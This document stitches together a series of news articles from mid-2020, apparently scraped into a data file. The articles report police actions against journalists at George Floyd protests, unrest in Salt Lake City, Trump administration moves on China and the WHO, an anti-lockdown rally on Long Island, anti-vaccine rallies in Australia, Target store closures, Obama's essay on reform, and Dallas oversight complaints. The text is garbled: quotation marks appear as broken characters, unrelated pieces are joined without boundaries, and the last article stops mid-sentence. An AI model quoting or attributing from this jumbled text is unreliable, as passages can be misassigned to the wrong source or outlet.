One CNN correspondent was arrested on live television while a photographer has been permanently blinded by a rubber bullet. By Lam Thuy Vo Posted on May 31, 2020, at 4:09 p.m. ET A journalist is seen bleeding after police started firing tear gas and rubber bullets in Minneapolis on Saturday. As protests against police brutality continue around the country, more than a dozen journalists have been injured and arrested by police officers while working. Protests broke out in Minneapolis, then spread around the country, after George Floyd died Monday when a police officer used a knee chokehold on him. Floyd's pleas for his life, saying â€œI canâ€™t breathe,â€ in an event that was captured on video echoed the killing of Eric Garner and brought renewed attention to the violence people of color face from police. Since then, journalists have been documenting the crowds of thousands who have gathered in cities including New York, Los Angeles, Atlanta, and Seattle. â€œTargeted attacks on journalists, media crews, and news organizations covering the demonstrations show a complete disregard for their critical role in documenting issues of public interest and are an unacceptable attempt to intimidate them,â€ said Carlos MartÃ­nez de la Serna of the Committee to Protect Journalists said in a statement condemning police actions. â€œAuthorities in cities across the U.S. need to instruct police not to target journalists and ensure they can report safely on the protests without fear of injury or retaliation.â€ Below are some of the injuries and arrests that have been captured through videos and images. Minneapolis Journalists from several news organizations have reported on social media that police have either arrested, harassed, or fired upon them with less-than-lethal force while covering ongoing protests. Minnesota police arrest CNN reporter and camera crew as they report from protests in Minneapolis https://t.co/oZdqBti776 On Friday, CNN correspondent Omar Jimenez and his crew were arrested live on camera, despite identifying themselves as journalists and offering to move. They were released from police custody a few hours later. LA Times reporter Molly Hennessy-Fiske posted a video of herself describing an encounter with Minnesota State Patrol officers during which she said a group of reporters identified themselves as press. The officers fired tear gas at the journalists â€œpoint-blankâ€ without responding to the reportersâ€™ pleas to tell them where they should go, she said. Minnesota State Patrol just fired tear gas at reporters and photographers at point blank range. Hennessy-Fiske said she was hit in the leg with a rubber bullet and posted a photo of her injury on Twitter: Thatâ€™s the PG version of my leg courtesy of @MnDPS_MSP still going to report tonight and tomorrow A photographer and activist was also struck in the left eye with what she believed was a rubber bullet and said she has been permanently blinded in that eye: Hey folks, took a tracer found to the face (I think, given my backpack) and am headed into surgery to see if we can save my left eye Am wisely not gonna be on Twitter while Iâ€™m on morphine Stay safe folks Several other reporters have also said they have been pepper-sprayed or arrested: I was pepper-sprayed then arrested last night by Minneapolis PD even after identifying myself as a reporter MULTIPLE times: Cop 1: *checks press badge as Iâ€™m on the ground* Cop 2: â€œRoll on your side, Mr. journalist.â€ Cop 3: *loads me in the car, sees my press badge and shrugs* ""I'M NOT FIGHTING"": Tom Aviles, an award-winning photographer with CBS Minnesota, was arrested and struck by a rubber bullet while covering protests in Minneapolis. https://t.co/uIJsKYOboi MSNBC reporters were just almost hit with some sort of explosive device by law enforcement officers in Minneapolis Minneapolis police march on a parking lot where VICE reporter @MichaelAdams317 is sheltering. He is wears a press badge. â€œIâ€™m Press! Press! Press!â€ Cop shouts â€œI DONâ€™T CAREâ€ and throws him to the ground. Another cop pepper sprays him directly in the face. On Sunday, Minnesota Gov. Tim Walz apologized for the second time about the ongoing arrests. â€œIt is unacceptable,â€ he said, adding he recognized the role journalists have to play in the protests. â€œI take full responsibility for that and won't equivocate no matter how difficult the environment is.â€ Denver NEW: Photographer Hyoung Chang was covering a George Floyd protest Thursday night in downtown Denver when police began firing cannisters of tear gas and balls loaded with pepper at the crowds. An officer fired two pepper balls directly at him, Chang said. https://t.co/PcWDZnQeBW In Denver, staff photographer Hyoung Chang for the Denver Post said police fired canisters of tear gas at the crowd and also fired pepper balls directly at him. Louisville, Kentucky In Louisville, Kentucky, police were captured on camera shooting what appear to be pepper balls at a local TV camera crew.

Regardless of the intent, this seems to be a much smarter strategy than shooting the streets up with teargas. Chattanooga Chief of Police David Roddy made a post on Twitter saying that police officers who donâ€™t have an issue with what happened to George Floyd should turn in their badges. There is no need to see more video. There no need to wait to see how â€œit plays outâ€. There is no need to put a knee on someoneâ€™s neck for NINE minutes. There IS a need to DO something.

The Minneapolis police arrested officer Derek Chavin in hopes to quell the protests, but the demonstrations have continued and expanded throughout the country. Chauvin is the recently fired officer who was seen in the now-viral video in which Floyd was killed. Chauvin kneeled on Floydâ€™s neck for several minutes as he gasped for air and begged for his life. He has been with the Minneapolis Police Department for 19 years, and in that time, he has been involved in multiple shootings in which people were killed, and has had multiple excessive force complaints during his career. The case has become so controversial because of the blatant use of force shown in the footage, but also because the evidence shows that Floyd was entirely complaint and peaceful throughout the arrest, and that there was no reason to be so forceful with him. The incident is such a flashpoint across the country because it has become a symbol of the experiences that so many other people in the country have with police. Police initially said Floyd was resisting arrest and had a medical incident. However, surveillance video obtained by CBS News showed Floyd cooperating with the officers, and video of his death clearly shows that he was not resisting. The videos to initially surface of the incident showed the moments where officer Derek Chauvin had Floyd pinned to the ground with his knee on Floydâ€™s neck. In those videos, Floyd was not fighting or struggling with the officers at all, but police claimed that he was resisting after he was first taken out of his car. Now, surveillance camera footage that was released from a nearby restaurant shows Floyd being removed from his car by police without resisting. The new video shows him being taken from the car and placed in handcuffs, which means that he had no opportunity to resist. "

1,"Menu  SALT LAKE CITY â€” A protest against police brutality in downtown Salt Lake City Saturday has escalated, leading to response from SWAT teams and the National Guard. The demonstration was one of multiple protests planned in response to the death of George Floyd, who died Monday in police custody after video showed a Minneapolis, Minnesota police officer kneeling on his neck for several minutes as he struggled to breathe and went unconscious. Organizers also say they are demonstrating for 22-year-old Bernardo Palacios-Carbajal, who was shot and killed by Salt Lake City Police one week ago. The department is expected to release body camera footage within 10 days of the incident. The protest was intended by organizers to be peaceful, but it gradually escalated as the Salt Lake City Police Department headquarters building was vandalized with spray-painted messages, and an unoccupied SLCPD vehicle has been overturned, smashed and set on fire at 200 East and 400 South. A Utah Transit Authority TRAX station was also damaged. Gov. Gary Herbert released a statement on the incident: â€œWe are in close contact with our department of public safety and receiving regular updates. Our hearts break for the family of George Floyd. We are grateful for the swift actions taken by the state of Minnesota to hold those responsible for his death accountable. We can not, however, condone violence, defacement of public buildings, and destruction of property. We call upon the good people of Utah to engage civilly and to act peaceably as they seek to exercise their first amendment rights.â€ He later announced he will be calling in the National Guard.Law enforcement, fire, paramedics or other medical personnel, news media, people traveling directly to and from work, traveling directly to and from the Airport, seeking medical care, fleeing dangerous circumstances, or those experiencing homelessness. Police have asked the public to avoid the Salt Lake metro area if possible. Many of the demonstrators have marched to the State Capitol, where Utah Highway Patrol are keeping anyone from going up the stairs leading to the building. SLCPD SWAT teams have now responded downtown along with agencies from surrounding areas. Salt Lake City Mayor Erin Mendenhall has announced a curfew at 8 p.m. Saturday through 6 a.m. Monday morning for the entire city. Mendenhall and SLCPD Chief Mike Brown said no one is allowed to be in public during that time even for traveling, but provided the following exceptions: Mendenhall and Brown held a press conference at 9 p.m. with an update on the curfew, asking the public to stay home and for protesters to go home. Brown also stated that six people had been arrested at the time. One officer was hit over the head with a baseball bat and is recovering in the hospital. Brown said if he had not been wearing a helmet, he would have likely been seriously injured or killed. About Us"

Mr. Trump has stepped up to the fight and announced that the U.S. is terminating its relationship with the World Health Organization over its handling of Chinaâ€™s role in the coronavirus crisis. He also imposed fresh sanctions on Beijing and Hong Kong officials for their security crackdown on the financial hub. The president disclosed over the weekend that he is working to add India, South Korea, Russia and Australia to the Group of Seven nationsâ€™ annual summit. Aides said the move is partly aimed at confronting Chinaâ€™s rising influence. TOP STORIES'Basic human decency': Utah governor urged to change his 'obscene' nameNational mile-driven tax pilot program tucked into $1.2 trillion infrastructure billMike Lindell's 2020 election symposium delayed by 'hacked' livestream â€œFor the first time, we have a president of the United States who is prepared to push back against [Chinaâ€™s threats] and protect the American people,â€ Secretary of State Mike Pompeo said Sunday on Fox Businessâ€™ â€œSunday Morning Futures.â€ The Global Times, a newspaper known as a Chinese Communist Party mouthpiece, suggested in a column that Beijing would be justified if it openly backed the protests and riots in the U.S. that have prompted eight governors to call out the National Guard. The column, written by Global Times Editor-in-Chief Hu Xijin, took aim at the Trump administration for threatening to impose sanctions on China over its new security law in Hong Kong. The newspaper also took aim at Mr. Pompeo and House Speaker Nancy Pelosi, California Democrat. It mocked a statement Mrs. Pelosi made nearly a year ago that pro-democracy protests in Hong Kong were â€œa beautiful sight to beholdâ€ at the time. â€œNow, the â€˜beautiful sightâ€™ is extending from Hong Kong to over a dozen U.S. states,â€ the paper said. â€œU.S. politicians now can enjoy this sight from their own windows.â€ The demonstrations and, in many cases violent rioting, began last week in Minneapolis, where George Floyd, a black man, died after a white police officer handcuffed him and knelt directly on his neck for nine minutes. The officer, Derek Chauvin, has since been charged with third-degree murder and manslaughter. â€œA quick question for Pelosi and Secretary of State Mike Pompeo: Should the Chinese government and National Peopleâ€™s Congress issue a statement to support the protests by African-Americans and the grassroots of U.S. society?â€ Mr. Hu wrote. â€œIt seems to be what Beijing should do according to the logic of Washington cheering for the rioters in Hong Kong.â€ Mr. Pompeo implicitly criticized the leadership of Chinese President Xi Jinping. â€œItâ€™s a different Chinese Communist Party today than it was 10 years ago,â€ he said. â€œThis is a Chinese Communist Party that has come to view itself as intent upon the destruction of Western ideals, Western democracies, Western values, and puts Americans at risk,â€ he said. â€œThe list is long, whether itâ€™s stealing American intellectual property, destroying hundreds and millions of jobs here in the United States, further efforts to put at risk sea lanes in the South China Sea, denying commercial traffic.â€ White House National Security Adviser Robert Oâ€™Brien said the presidentâ€™s decision to pull the U.S. out of WHO was designed to force the international organization to end its â€œreliance on China.â€ â€œWeâ€™re going to beat this COVID disease that was unleashed on us and came from China,â€ Mr. Oâ€™Brien said on CNNâ€™s â€œState of the Union.â€ â€œBut in the meantime, weâ€™re going to take that $440 million that the U.S. spends, compared to the $40 million that the Chinese spend on the WHO, and weâ€™re going to make sure it gets to front-line health care workers.â€ Mr. Trump announced Friday that the U.S. was terminating its relationship with WHO over its handling of the coronarvirus crisis and took actions to punish China for misleading the world on the virus and for its security crackdown on Hong Kong. The president also announced he was ending U.S. preferential trade treatment for Hong Kong. He said Hong Kong is no longer a separate territory because Beijing moved to curb its autonomy. â€œChinese officials ignored their reporting obligations to the World Health Organization and pressured the World Health Organization to mislead the world,â€ Mr. Trump announced in the White House Rose Garden. â€œThe Chinese government has continually violated its promises to us and so many other nations. These plain facts cannot be overlooked or swept aside.â€ Deaths in the U.S. from COVID-19 rose to nearly 104,000 on Sunday. Business shutdowns to slow the spread of the coronavirus have thrown roughly 40 million Americans out of work in less than three months. The president said the sudden hardship wrought by the virus was one reason he insisted on attending the first manned space launch in the U.S. in nine years on Saturday in Florida. â€œItâ€™s such a great inspiration for our country,â€ Mr. Trump said of the Space X launch. â€œWe think next year is going to be one of the best years weâ€™ve ever had, economically. We suffered something that was terrible. It should have never happened. It should have never come out of China, but it did. They didnâ€™t stop it. They were unable, probably, to stop it.â€ The president is imposing sanctions on Hong Kong and Chinese officials who are involved in restricting freedoms in Hong Kong. He also is moving to end Hong Kongâ€™s preferential trading status with the U.S. â€œHeâ€™s asked us to review every preferential treatment that Hong Kong had and work to eliminate it. It no longer make sense,â€ Mr. Pompeo said. The administration also is suspending the entry of â€œcertain foreign nationals from Chinaâ€ as potential security risks. The presidentâ€™s move will affect a small percentage of the approximately 360,000 Chinese students in the U.S., including graduate students and researchers with ties to the Chinese military. The president said Beijingâ€™s crackdown on Hong Kong â€œis a tragedy for the people of Hong Kong, the people of China and, indeed, the people of the world.â€ â€œChina claims it is protecting national security, but the truth is that Hong Kong was secure and prosperous as a free society,â€ Mr. Trump said. â€œBeijingâ€™s decision reverses all of that. It extends the reach of Chinaâ€™s invasive state security apparatus into what was formerly a bastion of liberty. China has replaced its promise formula of â€˜one country, two systemsâ€™ with â€˜one country, one system.â€™â€ Rep. Chris Smith, New Jersey Republican and a leading congressional critic of Chinaâ€™s human rights record, said past administrations answered China with â€œcheap rhetoricâ€ that emboldened its communist rulers. â€œPresident Trump, however, is beginning to change that and is doing what previous presidents have failed to do,â€ Mr. Smith said. â€œFor the sake of oppressed people, the United States â€” even if we have to go it alone â€” must impose sanctions.â€ The State Department outraged Chinese leaders last week by declaring that U.S. leaders officially assess that Hong Kong no longer has the legal and economic freedom that the Chinese government promised under its treaty with Britain that gave the former colony back to Beijing in 1997. Chinese media accused Mr. Trump of hypocrisy with his sanctions over Hong Kongâ€™s protests. â€œTrump really had the nerve to make the announcement when a group of furious Washington citizens were storming toward the White House,â€ the Global Times column said Saturday. â€œWashington must have failed to anticipate that retribution could come that fast. It should be thinking about it though.â€ In classic pro-China propagandist fashion, the Global Times column characterized the U.S. demonstrations as equivalent to protests against Chinese communist authoritarianism that have been rocking Hong Kong in recent years. Hundreds of thousands of pro-democracy demonstrators have taken to the streets in the territory to push back against the Chinese communist governmentâ€™s gradual moves to strip the global financial hub of freedoms and governmental autonomy. Citing the clashes in American cities, the Global Times claimed that it is â€œas if the radical rioters in Hong Kong somehow snuck into the U.S. and created a mess.â€ The column suggested that the U.S. protests were a kind of punishment for Mr. Trump over his policy on Hong Kong and said the U.S. political system is â€œdecliningâ€ at an â€œacceleratingâ€ rate. It sought to cast the authoritarian communist government in Beijing as superior. â€œThe odds of outbreaks of riots in the U.S. are much higher than they are in China,â€ it claimed. â€œHow could politicians in Washington possibly define the disturbances in other countries as â€˜beautiful sightsâ€™ publicly? It is stupid to do so simply because they want to attack China. Letâ€™s wait and see which country will encounter more chaos.â€ â€¢ Tom Howell Jr. and Stephen Dinan contributed to this report.

Donald Trump praised protesters who harassed a journalist on Long Island this week at a rally where one man called for the execution of Dr. Anthony Fauci. The president of the United States voiced his support on Saturday for a protest against New York stateâ€™s public health orders that was backed by an anti-government militia and anti-vaccine activists who called for the execution of Dr. Anthony Fauci, the nationâ€™s senior immunologist. The â€œRe-Open NYâ€ rally on Thursday in Commack, New York was organized by a group of Trump supporters who call themselves the Setauket Patriots, but also endorsed by anti-vaccination activists and the Long Island branch of the Oath Keepers, a national organization of current and former law enforcement officers and military veterans who think they are defending the nation from a range of imaginary threats posed by the federal government. Amid a sea of American flags and Trump banners, several of the signs waved by the protesters referenced conspiracy theories promoted by radical anti-vaccine activists that demonize Fauci and the philanthropist Bill Gates. A protester at a rally in Commack, New York on Thursday displayed a sign calling for the execution of the nationâ€™s leading immunologist and a billionaire philanthropist. Photo: News 12 Long Island In addition to placards calling for New York to open businesses, others displayed at the rally channeled conspiracy theories from anti-vaccine activists who believe that Bill Gates is somehow behind the crisis. â€œJust Say NO to Bill Gates,â€ read one sign. Another, with idiosyncratic punctuation, read: â€œMy Sonâ€™s Are Not Lab Rats For Bill Gates Vaccine.â€ The protest outside a shuttered department store was attended by just a few hundred people, but it drew national attention after a local news reporter, Kevin Vesey, posted video of himself being harassed by demonstrators. The level of anger directed at the media from these protestors was alarming. As always, I will tell a fair and unbiased story today. pic.twitter.com/5jCR0YY9VH The protesters echoed the presidentâ€™s anti-media harangues by complaining to Vesey that his channel, News 12 Long Island, had â€œstopped airing the Trump briefings,â€ and taunted him with the chant, â€œFake news is not essential.â€ One woman told the reporter, â€œYouâ€™re the virus.â€ Another accused him of â€œdestroying Suffolk and Long Islandâ€ through his reporting on the coronavirus crisis. Suffolk County, where the protest took place, has been among the worst hit in the United States, with 37,942 confirmed cases of Covid-19 and 1,733 deaths as of Saturday. That means the suburban New York county of just under 1.5 million people has a mortality rate more than 4 times the national average. One of those cases was News 12â€™s Vesey, who tested positive last month and recently recovered from a relatively mild case of the illness. During a longer Facebook Live report from the demonstration, Vesey was menaced at close range by a man in a Trump hat and shirt who was not wearing a mask but said that he did not need to keep his distance because, â€œI got hydroxychloroquine; Iâ€™ll be fine, bro.â€ The man held a sign that called on one side for New Yorkâ€™s Democratic governor, Andrew Cuomo, to be deposed, and on the other accused his brother, Chris Cuomo, of lying about his bout with Covid-19. Another protester held up a sign saying Fauci â€œhas to goâ€ and falsely asserted that he â€œworks forâ€ for the World Health Organization. The television report Vesey filed on Thursday evening included video of one of the demonstrators displaying a sign for the camera that read: â€œHang Fauci, Hang Gates, Open Up All Our States.â€ I'll probably never forget what happened today.I was insulted. I was berated. I was practically chased by people who refused to wear masks in the middle of a pandemic.All the while, I was there to tell THEIR story. Here's the finished product. pic.twitter.com/HV2Hrcs7gi On Saturday morning, in a tweet that echoed his infamous praise for white supremacists who marched in Charlottesville in 2017, Trump described the protesters who had harassed the reporter as â€œGreat people!â€ James Robitsek, a leader of the pro-Trump Setauket Patriots group that organized the protest, confirmed in a Facebook message on Saturday that his call for opponents of the lockdown to rally had been supported by the local chapter of the anti-government Oath Keepers militia. â€œThey copied my post and made up their own for their group,â€ Robitsek said of the Oath Keepers. â€œThey come to our events and vice versa. We all share events, our group is only 40-50 members.â€ Thursdayâ€™s gathering, he said, included â€œmany people from other groups, or who just saw the post and wanted to come down.â€ The Oath Keepersâ€™s name is a reference to the belief of its members that they are bound by their pledge to â€œdefend the Constitution against all enemies, foreign and domestic,â€ even if that means defying the government. As Justine Sharrock reported for Mother Jones in 2010, a year after the group was founded, some of the groupâ€™s first members were convinced then that it would not be long â€œbefore President Obama finds some pretext â€” a pandemic, a natural disaster, a terror attack â€” to impose martial law, ban interstate travel, and begin detaining citizens en masse.â€ In an open letter posted online last month, the Long Island branch of the militia group echoed that belief, by declaring that the stateâ€™s orders to shut down businesses, churches and public gatherings were the acts of â€œan overbearing government acting under the guise of benevolenceâ€ and had created â€œan untenable situationâ€ that justified resistance. â€œAny government, or governing representative which acts in such a manner, attempts to act outside of the Constitution, and must be put on notice as doing such,â€ the group wrote. The national groupâ€™s founder, Stewart Rhodes, a libertarian trial lawyer and former Ron Paul staffer, mocked Trump earlier this week for tweeting in support of protesters in Pennsylvania who want to re-open businesses. â€œUh, they are using YOUR Adminâ€™s guidelines, including the Orwellian â€˜essential/non-essentialâ€™ paradigm, which is like something out of the USSR,â€ Rhodes tweeted back at the president. On Twitter, Rhodes has also shared anti-vaccine conspiracy theories related to the Covid-19 pandemic, including one meme that described Gates as a â€œvaccine pushing globalist eugenicistâ€ and urged readers â€œto REFUSE to take ANY vaccine he funds, â€˜mandatoryâ€™ or not.â€ He also encouraged his followers to listen to a podcast in which Robert F. Kennedy Jr. attacked Gates and boosted a conspiracy theory about Fauci. The baseless smear on Fauci was first made by a discredited scientist who claims, without evidence, that the National Institute of Allergy and Infectious Diseases director buried her research about how vaccines can damage peopleâ€™s immune systems. Those false claims about Fauci and Gates have been spread widely by the pro-Trump conspiracy group QAnon and by prominent anti-vaccine activists who have taken a leading role in recent protests demanding an end to the emergency public health orders in California, Texas and New York. Robitsek, the Setauket Patriotsâ€™ leader, insisted that three of the people seen in Veseyâ€™s video harassing the reporter were â€œnot associated with our groupâ€ and suggested that at least one of them â€” the man who had refused stay away from the reporter â€” might have been â€œa plant by left leaning groups in the area who were against our rally coming to Commack.â€ If so, the man has been under deep cover for some time, since a photograph on the Setauket Patriots Facebook page shows that he was also at a previous protest at the same spot two weeks ago. On that occasion, which was also covered by Vesey for News 12 Long Island, the man made no attempt to harass the reporter and did nothing to tarnish the reputation of the protesters. As for the woman who told Vesey he was the virus, Robitsek called her â€œa wacko,â€ and noted that she travels to protests all across the tri-state area of New York, New Jersey and Connecticut provoking confrontations and filming them for her groupâ€™s Facebook page. Robitsek, who said that he has been unemployed for almost nine weeks and is yet to receive any payment from the state, cast the rally as a non-partisan attempt to push New York to let people earn a living. â€œWe all need to work,â€ he said. â€œGive me my unemployment, and Iâ€™ll stay home then but I need to pay my bills and eat. People are getting desperate.â€ Anxious to counter the negative publicity generated by Veseyâ€™s video, Robitsek also suggested that a â€œlocal moms groupâ€ that was opposed to the rally had been â€œin cahoots with the media before it even started.â€ But the only evidence he could cite for that was a screenshot of a Facebook post from a member of the group Commack Parents Network, in which she had simply passed on an interview request from Vesey, saying that he would like one or more of them to explain why they were opposed to the re-opening protest taking place in their town. Robitsek also said that his group had agreed not to wave Trump flags, in a bid to be bipartisan, but many members of other groups who came to the rally did so. For his part, Robitsek wore what appeared to be one of Trumpâ€™s red caps, albeit a more understated one â€” with â€œUSAâ€ stitched on the front and â€œ45â€ on the side â€” and a mask, while carrying an American flag. In addition to his group and the Oath Keepers, Robitsek said, members of the Conservative Society for Action also attended the rally, as did, â€œa bunch of anti-vaccine people.â€ Updated: Monday, May 18 1:12 a.m. PDTThis article was updated with a new headline. Robert Mackey[email protected]â€‹theintercept.com@RobertMackey The findings sparked a media sensation and led to a change in federal law. The insurance giantâ€™s role was surprisingly common.

1,"Police say those in breach of Covid-19 directions at Sydney, Brisbane and Melbourne rallies face fines of $1,652 each Last modified on Wed 1 Jul 2020 12.20 EDT Hundreds of anti-vaccination protesters have defied social distancing measures at rallies in Sydney, Brisbane and Melbourne. Protesters claiming the Covid-19 pandemic was a â€œscamâ€ gathered at the Royal Botanic Gardens in Melbourne on Saturday, and carried signs declaring they were against vaccines and 5G technology.  Their placards claimed â€œ5G = communismâ€, â€œCovid 1984â€ and â€œour ignorance is their strengthâ€. They booed police â€“ clad in gloves and face masks â€“ who warned the crowd that they were breaching social distancing rules designed to slow the spread of coronavirus. In a statement, police said those found in breach of Covid-19 directions faced fines of $1,652 each. In Sydney, up to 500 protesters voiced conspiracy theories regarding not only vaccination but also 5G telecommunication networks, fluoride and large pharmaceutical corporations. Anti-5G protesters gather in spot with the best 5G coverage in Brisbane. https://t.co/dJFGJRTrTP Weâ€™ve finished a loop and are back at the start.

They chanted â€œfreedom of choiceâ€ and â€œmy body, my choiceâ€ on the march, with some attempting to raise the spectre of a â€œnew world orderâ€. The walk passed without incident or police intervention. When asked about the protest, Victoriaâ€™s chief health officer, Brett Sutton, said â€œthereâ€™s no message that can get through to people who have no belief in scienceâ€. â€œThereâ€™s probably no reaching them,â€ he earlier told reporters."

Protests erupted in cities across the country Friday night, including in Lousiville, Kentucky. Reporter Kaitlin Rust of WAVE was on the ground covering the events when a police officer intentionally opened fire on her and her camera operator, seemingly striking them both with pepper balls. Rust was certainly not in any type of disguise -- she was wearing a reflective vest, holding a microphone and not in a crowded group of people -- so it begs the question ... what the hell was the officer doing? Luckily, Rust appeared to be okay and continued to broadcast from the scene. As we reported ... a police car was set on fire in Atlanta and The White House placed on lockdown as protests continued Friday. Officer Derek Chauvin -- who kept his knee on Floyd's neck for nearly 9 minutes while he died -- was arrested Friday and charged with 3rd-degree murder and 2nd-degree manslaughter. The other 3 officers involved have not yet been arrested or charged."

1,"Target Stores, which had its Minneapolis-area locations looted during riots that erupted there last week in the aftermath of George Floydâ€™s death, is closing more than 100 stores temporarily as rioting breaks out across the country. The company announced the closings on its website. Target had initially closed more than 170 stores, but allowed some stories to reopen on Sunday. According to the list on the website Sunday morning, in addition to closing 33 stores in Minnesota, Target is closing 46 stores in California, two in Colorado, two in Georgia, seven in Illinois, one in Michigan, one in New York, eight in Oregon, three in Pennsylvania, and three in Texas. â€œWe are heartbroken by the death of George Floyd and the pain it is causing communities across the country. At this time, we have made the decision to close a number of our stores. We anticipate most stores will be closed temporarily,â€ the company said in a statement. The company noted in its statement that it was concerned about the safety of its employees. â€œOur focus will remain on our team membersâ€™ safety and helping our community heal,â€ the statement said. â€œWe are providing our team members with direct communications updates regarding any store impact where they work. Additionally, team members impacted by store closures will be paid for up to 14 days of scheduled hours during store closures, including COVID-19 premium pay. They will also be able to work at other nearby Target locations.â€ Some commenters on Twitter wrote that Targetâ€™s losses did not matter.

1,"May 31, 2020, 6:31 am* For the past several days and nights, protests have sprung up in numerous cities against police brutality and state violence against black men and women. They began in Minneapolis, where a man named George Floyd was killed by Officer Derek Chauvin, who leaned on Floydâ€™s throat for eight minutes as he begged to be released, saying he could not breathe. The horrific scene was caught on tape and widely shared. As peaceful protesters were met with even more violence, including tear gas, pepper spray, and rubber bullets, tensions exploded. A police precinct was taken over and set on fire. Riots and looting took over many areas. Soon the city was put under a curfew, but it was too late to quell the rebellion. People all across the U.S. are fed up with the violence perpetrated by cops, especially racially motivated attacks against black citizens. Protests have sprung up in almost every state, in numerous cities. While most of these protests have started out as peaceful marches and gatherings, many have escalated as militarized police forces turn their weapons on the people, seemingly with impunity. Journalists have been arrested and targeted, even while cameras are running. There is a stark contrast of enforcement responses to anti-lockdown #protests where armed white civilians stormed govâ€™t buildings & others are on camera shoving police vs. nationwide #protests against police violence, where targeted arrests & use of force are deployed by police. https://t.co/rCcqBR9O7C â€” Dreisen Heath (@dreisenheath) May 30, 2020  Itâ€™s unclear how things will end, but after months of lockdown and over 100,000 people dead of a virus the government has failed to contain, plus a looming depression, people are not going to be placated by platitudes anymore.

1,"The former president wrote about how to use this moment to make ""real change."" Communities come together in wake of George Floydâ€™s death Former President Barack Obama published a piece on Medium on Monday addressing the protests nationwide following the death of George Floyd -- and, specifically, how he thinks people can move forward to ""sustain momentum to bring about real change."" ""Ultimately, itâ€™s going to be up to a new generation of activists to shape strategies that best fit the times,"" he wrote. ""But I believe there are some basic lessons to draw from past efforts that are worth remembering."" His message overall stressed the importance of voting and participating in politics, particularly at the local level, where decisions on ground-level criminal justice and police practices are formed. The ""bottom line,"" he wrote, is that ""if we want to bring about real change, then the choice isnâ€™t between protest and politics. We have to do both. We have to mobilize to raise awareness, and we have to organize and cast our ballots to make sure that we elect candidates who will act on reform."" The nation's first and only African American president began by acknowledging that ""the waves of protests across the country represent a genuine and legitimate frustration over a decades-long failure to reform police practices and the broader criminal justice system in the United States,"" noting that most people demonstrating have been ""peaceful, courageous, responsible, and inspiring."" He also noted that ""police in cities like Camden and Flint have commendably understood"" that the protesters ""deserve our respect and support."" He also addressed the violence that has broken out at protests in several cities, although the exact root of that violence has been disputed, especially as it differs between locations. In his post, Obama requested people ""not excuse violence, or rationalize it, or participate in it."" From there, Obama addressed the importance of participating in politics and voting in every election, saying that ""the elected officials who matter most in reforming police departments and the criminal justice system work at the state and local levels."" He said reform agendas will vary from place to place but should be tailored to each community and that it's up to organizers to educate themselves of what strategies work best. ""The more specific we can make demands for criminal justice and police reform, the harder it will be for elected officials to just offer lip service to the cause and then fall back into business as usual once protests have gone away,"" he wrote. Obama concluded his letter by acknowledging the pain in America, amid protests and a pandemic. ""I recognize that these past few months have been hard and dispiriting -- that the fear, sorrow, uncertainty, and hardship of a pandemic have been compounded by tragic reminders that prejudice and inequality still shape so much of American life,"" he wrote. ""But watching the heightened activism of young people in recent weeks, of every race and every station, makes me hopeful."" He said the next moment in American history can be ""a real turning point"" if ""we can channel our justifiable anger into peaceful, sustained, and effective action."" The post also linked up to a toolkit developed by the Leadership Conference on Civil and Human Rights, based on a task force on policing Obama formed while at White House, and also to resources at the Obama Foundation, he said, ""to help young activists sustain the momentum by channeling their energy into concrete action."" Later Monday, Obama summarized the essay in a series of tweets, saying in part: ""Ultimately, itâ€™s going to be up to a new generation of activists to shape strategies that best fit the times."" This is the second time the former president has written something on the nation's unrest in the aftermath of the death of George Floyd. ""This shouldn't be 'normal' in 2020 America,"" Obama wrote in a statement posted to Twitter Friday. ""It can't be 'normal.' If we want our children to grow up in a nation that lives up to its highest ideals, we can and must be better."" President Donald Trump, meanwhile, has taken a different approach, facing some criticism for failing to address and unify the nation as protests grew over the weekend. Hours before Obama issued a statement Friday, Trump tweeted about the protests in Minneapolis, saying that ""thugs are dishonoring the memory of George Floyd"" and, referencing the military, that ""when the looting starts, the shooting starts."" The tweet was flagged by Twitter as ""glorifying violence."" Trump on Sunday blamed ""ANTIFA"" for the protests turning violent and said he would label it as a terrorist organization, although his authority to deem a domestic group a terror organization remains unclear. 24/7 coverage of breaking news and live events"
1,"Watch CBSN Live  Updated on: June 4, 2020 / 3:40 PM / CBS News Dallas â€” Brandon Saenz was in a crowd protesting police brutality Saturday when he says he became a victim of it. ""All I heard was a boom. I got hit,"" Saenz said. ""I put my hands up, and I put my hand on my eye, and then I took off running,"" he said. The 26-year-old said he did nothing to provoke being shot with a non-lethal sponge round, but as a result, attorneys say, he lost his left eye, CBS Dallas-Fort Worth reports. ""It is ironic that a protest about excessive use of force and police brutality ends with excessive use of force and police brutality,"" said Jesuorobo Enobakhare, who chairs the Dallas Police Oversight Board. Protesters have called for the Police Oversight Board to resume regular meetings that stopped during the coronavirus shutdowns. Next week it will. On its agenda will be votes on whether to investigate how the Dallas Police Department handles protests, as well as an incident that happened Monday night when hundreds of protesters walked onto the Margaret Hunt Hill Bridge. CBS DFW said it heard bangs and saw smoke, and saw a protester being carried away. ""She was flash-banged by police officers for walking peacefully,"" said the person helping her from the scene. Dallas Police Oversight monitor Tonya McClary, who reports to the board, said her office has seen a surge in complaints in the last two days. ""Our voicemail is almost full. We're still going through emails. What we've been able to get through right now is about 100,"" she said. Some cases, like Saenz's, have been fast-tracked and are already under investigation. McClary said some complaints against officers may be tossed out. Others could lead to discipline. The most serious cases could result in criminal investigations of officers involved. She said her office will independently review the department's decisions and, if it disagrees with any, can launch its own investigation. She and the board will also be able to look at the bigger picture and recommend any policy changes for the Dallas Police Department as a whole. The board is asking for photos, videos and first-hand accounts from the Margaret Hunt Hill Bridge protest. First published on June 4, 2020 / 1:07 PM Â© 2020 CBS Interactive Inc. All Rights Reserved.

1,"Pien Huang Allison Aubrey In the midst of the coronavirus pandemic, the World Health Organization took time at its daily press conference to address another pressing issue: the wave of protests against police violence and racial injustice. The demonstrations began in the U.S. when George Floyd died on May 25 after a police officer had pressed a knee into his neck for 8 minutes and 46 seconds while detaining him in Minneapolis. The protests are now spreading around the world to Europe, Africa and other regions. ""WHO fully supports equality and the global movement against racism. We reject discrimination of all kinds,"" said WHO director-general Tedros Adhanom Ghebreyesus on June 8. The demonstrations have prompted fear that the close contact of thousands of marchers could lead to a spike in case counts â€” which hit a new high on Sunday, with 136,000 cases reported that day. Modelers say it's difficult to assess how the protests will influence COVID-19 infections. Because COVID-19 generally has an incubation time of up to two weeks, public health officials think it will take a couple of weeks before they see the impact. But it's clear that a key ingredient for transmission is present at many of these rallies: close contact. The images of protesters standing shoulder to shoulder â€” some wearing face masks, others not â€” raise concerns, especially in cities with higher rates of infection. To that end, Tedros recommends that protesters 